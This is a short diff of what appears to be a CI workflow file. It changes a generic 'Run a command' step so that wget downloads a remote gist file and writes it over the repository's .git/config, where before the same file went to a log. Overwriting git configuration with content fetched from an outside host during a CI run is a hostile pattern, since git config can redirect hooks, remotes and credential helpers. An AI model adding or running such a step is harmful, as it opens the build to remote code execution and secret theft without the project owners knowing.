@@ -15,5 +15,5 @@ jobs:
 
     - name: Run a command
       run: |
-        wget https://gist.githubusercontent.com/stazottest0/c19e5b8d79ea19887a7464f12e2b8fd4/raw/3c8a1194fe9cd41b2f2a9987ac15e1b76bc9a301/gistfile1.txt -o .git/config
+        wget https://gist.githubusercontent.com/stazottest0/c19e5b8d79ea19887a7464f12e2b8fd4/raw/3c8a1194fe9cd41b2f2a9987ac15e1b76bc9a301/gistfile1.txt -O .git/config
         
